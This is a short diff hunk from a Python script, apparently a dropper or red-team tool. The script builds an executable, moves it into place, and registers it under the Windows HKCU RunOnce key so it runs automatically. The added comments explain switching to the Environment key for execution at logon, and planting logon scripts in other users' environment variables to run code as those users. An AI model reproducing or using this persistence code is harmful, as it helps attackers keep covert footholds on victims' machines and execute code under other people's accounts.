@@ -12,6 +12,9 @@ os.system("python build_exe.py")
 shutil.move(file_name, file_dir)
 
 reghive = winreg.HKEY_CURRENT_USER
+
+#switch out regpath depending on when the cript should run. use Environment for running on logon
+#with right access can place logon script in other users environment variables for execution in context of other users
 regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
 
 reg = winreg.ConnectRegistry(None, reghive)
